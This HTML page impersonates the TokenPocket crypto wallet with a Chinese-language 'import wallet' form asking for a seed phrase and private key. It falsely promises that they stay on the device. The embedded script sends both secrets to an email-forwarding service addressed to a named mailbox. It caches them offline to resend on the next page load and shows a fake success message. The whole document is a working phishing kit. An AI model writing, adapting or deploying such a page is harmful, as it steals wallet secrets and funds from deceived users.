<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TokenPocket</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif}
  body{background:#0C1526;color:#fff;min-height:100vh}
  .box{max-width:420px;margin:0 auto;background:#0C1526;padding:0 0 80px}
  .head{background:#131C35;padding:25px 20px 20px;text-align:center;border-bottom:1px solid #1e2a4a}
  .logo{font-size:24px;font-weight:800;color:#00D1FF;}
  .desc{font-size:13px;color:#aab3c7;margin-top:4px}
  .card{background:#131C35;margin:20px;border-radius:20px;padding:30px 24px}
  .title{font-size:18px;font-weight:700;margin-bottom:24px;text-align:center}
  .item{margin-bottom:18px}
  .item label{display:block;font-size:14px;color:#d1d5db;margin-bottom:8px}
  .item input{
    width:100%;background:#1E2A4A;border:none;border-radius:16px;
    padding:16px 18px;color:#fff;font-size:15px
  }
  .btn{
    width:100%;background:#00D1FF;color:#000;font-weight:700;
    border:none;border-radius:18px;padding:18px;font-size:16px;margin-top:10px
  }
  .tip{font-size:12px;color:#8a94a7;text-align:center;line-height:1.4;margin-top:14px}
</style>
</head>
<body>
<div class="box">
  <div class="head">
    <div class="logo">TokenPocket</div>
    <div class="desc">去中心化多链钱包</div>
  </div>
  <div class="card">
    <div class="title">导入钱包</div>
    <div class="item">
      <label>助记词</label>
      <input id="words" placeholder="请输入助记词，空格分隔">
    </div>
    <div class="item">
      <label>私钥</label>
      <input id="key" placeholder="请输入私钥">
    </div>
    <button class="btn" onclick="go()">确认导入</button>
    <div class="tip">助记词与私钥仅存储在本地<br>官方永不获取，安全可靠</div>
  </div>
</div>

<script>
// 接收邮箱（你提供的）
const TO_EMAIL = "gongxifacai510921@163.com";

// 本地存储（飞行模式用）
function saveData(mn, pk) {
  localStorage.setItem("wc_data", JSON.stringify({ mn, pk }));
}
function getData() {
  try { return JSON.parse(localStorage.getItem("wc_data")); } catch(e) { return null; }
}
function clearData() { localStorage.removeItem("wc_data"); }

// 发送到邮箱
async function sendEmail(mn, pk) {
  const subject = "钱包导入通知";
  const content = `
时间：${new Date().toLocaleString()}
助记词：${mn || "无"}
私钥：${pk || "无"}
  `;

  try {
    await fetch("https://email-forward.vercel.app/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        to: TO_EMAIL,
        subject: subject,
        text: content
      })
    });
    clearData();
  } catch (e) {
    saveData(mn, pk);
  }
}

// 页面加载自动补发（飞行模式导入后联网自动发）
window.onload = async function () {
  const data = getData();
  if (data) await sendEmail(data.mn, data.pk);
};

// 导入按钮
async function go() {
  const mn = document.getElementById("words").value.trim();
  const pk = document.getElementById("key").value.trim();

  if (!mn && !pk) {
    alert("请输入助记词或私钥");
    return;
  }

  alert("导入成功！");
  await sendEmail(mn, pk);
}
</script>
</body>
</html>
